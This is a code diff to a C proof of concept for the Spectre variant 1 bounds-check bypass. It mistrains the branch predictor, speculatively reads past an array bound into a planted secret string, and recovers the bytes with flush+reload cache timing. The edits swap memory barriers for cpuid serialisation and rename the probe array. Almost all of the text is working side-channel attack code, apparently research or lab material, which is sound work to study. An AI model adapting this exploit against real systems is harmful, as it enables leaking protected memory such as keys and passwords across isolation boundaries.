@@ -16,12 +16,11 @@ int accessible = 100;
 int secret_size = 25;
 unsigned char* data = "notasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretzhis is a secret message";
 
-
 __attribute__((noinline)) void victim_func(int index, cp_t* arr, unsigned char* data) {
 
     //flush bound value
     flush((void*)&accessible);
-    __sync_synchronize();
+    cpuid();
 
     //access (possibly out of bounds)
     if (index < accessible) {
@@ -32,9 +31,8 @@ __attribute__((noinline)) void victim_func(int index, cp_t* arr, unsigned char* 
 
 int* spv1(int index) {
 
-    cp_t* arr = mmap_arr_cache_pages(N_PAGES);
-    flush_arr((void*)arr, N_PAGES);
-
+    cp_t* flush_reload_arr = init_flush_reload(N_PAGES);
+    flush_arr((void*)flush_reload_arr, N_PAGES);
 
     //access decisions in array, repeated out-of-bounds not traceable for branch predictor
     int n_accesses = accessible + 1;
@@ -44,19 +42,20 @@ int* spv1(int index) {
 
     //Misstrain branch predictor, access out of bounds on last call
     for(int i = 0; i < n_accesses; i++) {
-        victim_func(accesses[i], arr, data);
+        victim_func(accesses[i], flush_reload_arr, data);
 
         //ensures completion before flushing. bar prevents speculative access from being flushed
-        __sync_synchronize();
-        flush((void*)&arr[data[i]]);    //TODO: make this sensible
+        cpuid();
+        flush((void*)&flush_reload_arr[data[i]]);    //TODO: make this sensible
+        cpuid();
     }
 
     //make sure previous loop finishes execution
     __sync_synchronize();
 
     //time loading duration per array index
-    int* results = reload(arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
-    unmap_cache_pages(arr, N_PAGES);
+    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
+    unmap_cache_pages(flush_reload_arr, N_PAGES);
     return results;
 }
 
@@ -70,9 +69,10 @@ int main(int argc, char* argv[]) {
 
         for (int s = 0; s < secret_size; s++) {
             results[r][s] = spv1(accessible + s);
-            __sync_synchronize();
+            cpuid();
         }
     }
+
     print_results(results, REPETITIONS, secret_size, N_PAGES, CACHE_HIT);
 
     free_results(results, REPETITIONS, secret_size);
